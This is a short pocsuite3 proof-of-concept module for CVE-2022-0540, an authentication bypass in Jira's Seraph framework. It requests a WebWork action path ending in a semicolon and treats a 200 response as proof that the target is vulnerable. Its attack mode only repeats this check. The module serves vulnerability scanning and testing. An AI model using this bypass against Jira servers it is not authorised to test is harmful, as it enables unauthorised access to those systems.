from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger, VUL_TYPE, OptString


class DemoPOC(POCBase):
    vulID = "0"
    version = "1"
    author = "wuerror"
    vulDate = "2022-04-20"
    createDate = "2022-05-11"
    updateDate = "2022-05-11"
    references = ["https://confluence.atlassian.com/kb/faq-for-cve-2022-0540-1123193843.html"]
    name = " Authentication Bypass in Seraph - CVE-2022-0540."
    appPowerLink = "https://www.atlassian.com/software/jira"
    appName = "Jira"
    appVersion = "<8.13.18"
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []
    install_requires = []
    desc = """
             Jira 和 Jira Service Management 容易受到其 Web 身份验证框架 Jira Seraph 中的身份验证绕过的攻击。
             未经身份验证的远程攻击者可以通过发送特制的 HTTP 请求来利用此漏洞，
             以使用受影响的配置绕过 WebWork 操作中的身份验证和授权要求。
        """  # 漏洞简要描述
    pocDesc = """
            poc的用法描述
        """  # POC用法描述

    def _verify(self):
        result = {}
        path = "/InsightPluginUpdateGeneralConfiguration.jspa;"
        url1 = self.url.rstrip('/') + path
        res = requests.get(url1, allow_redirects=False)
        if res.status_code == 200:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url1
            result['VerifyInfo']['Path'] = path
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(DemoPOC)
